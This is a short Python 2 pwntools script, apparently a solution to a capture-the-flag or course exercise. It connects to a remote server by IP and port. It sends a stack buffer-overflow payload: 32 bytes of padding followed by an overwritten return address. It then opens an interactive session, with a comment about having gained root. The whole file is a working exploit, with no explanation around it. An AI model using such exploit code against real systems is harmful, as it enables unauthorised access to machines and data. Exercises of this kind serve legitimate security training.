#!/usr/bin/env python

from pwn import *

context(arch = 'i386', os = 'linux')

#test for question 1
conn = remote('140.115.53.13',11001)

conn.recvuntil("Read your input :")

inputString = "aaaabbbbccccddddeeeeffffgggghhhh\xfd\x84\x04\x08\n";
print inputString
conn.send(inputString)

#after get root, we can use interactive mode, it will more convenient 
conn.interactive()


